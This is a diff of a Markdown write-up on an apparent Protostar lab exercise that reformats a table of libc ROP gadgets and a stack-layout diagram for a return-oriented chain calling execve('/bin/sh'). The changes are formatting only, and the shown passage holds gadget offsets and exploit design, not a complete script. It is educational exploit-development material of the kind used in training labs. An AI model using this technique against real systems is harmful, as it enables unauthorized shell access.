@@ -881,15 +881,14 @@ le91688:~/workspace/proto$ grep -w "xor eax, eax" LIBCgadgets
 0x0002f0ec : xor eax, eax ; ret
 le91688:~/workspace/proto$ grep -w "xor eax, eax" LIBCgadgets
 ```
-Using this i'm able to find the following
-| useful gadgets                     |
-| :------------------------------- | 
-|0x000f9482  : pop ecx ; pop ebx ; ret       #load values from stack to ECX, EBX|
-|0x00001aa2  : pop edx ; ret                 #load value in EDX|
-|0x001454c6  : add eax, 0xb ; ret            #add 0xb to EAX|
-|0x0002f0ec  : xor eax, eax ; ret            #Zero out EAX|
-|0x0002e725  : int 0x80                      #syscall|
-
+Using this i'm able to find the following useful gadgets:
+```asm
+0x000f9482  : pop ecx ; pop ebx ; ret       #load values from stack to ECX, EBX
+0x00001aa2  : pop edx ; ret                 #load value in EDX
+0x001454c6  : add eax, 0xb ; ret            #add 0xb to EAX
+0x0002f0ec  : xor eax, eax ; ret            #Zero out EAX
+0x0002e725  : int 0x80                      #syscall
+```
 Now, the memory values for each gadget are the offset within the loaded library, so we need to get the base address of the library when its loaded.
 
 Warning: GDB info sharedlibrary is not a good way to do this and will lead to anger and hatred. Please dont ask me how i know. Instead use the following method. We will also grab the location of "bin/sh" in memory, as done in stack6.
@@ -937,6 +936,7 @@ So we have can see that our library libc-2.19.so is loaded in memory starting at
 
 We are starting to get a pile of info, but I promise it will all come together soon, beautifully!
 Next, lets design our stack:
+```asm
 higher memory
 +----------------------+
 |...  INT0x80       ...|  syscall should be "execve( "/bin/sh",0,0)
@@ -960,6 +960,7 @@ higher memory
 |...filler A's ...     |  
 ---------------------- +
 ---lower memory---
+```
 
 Now we can put this all together with python
 
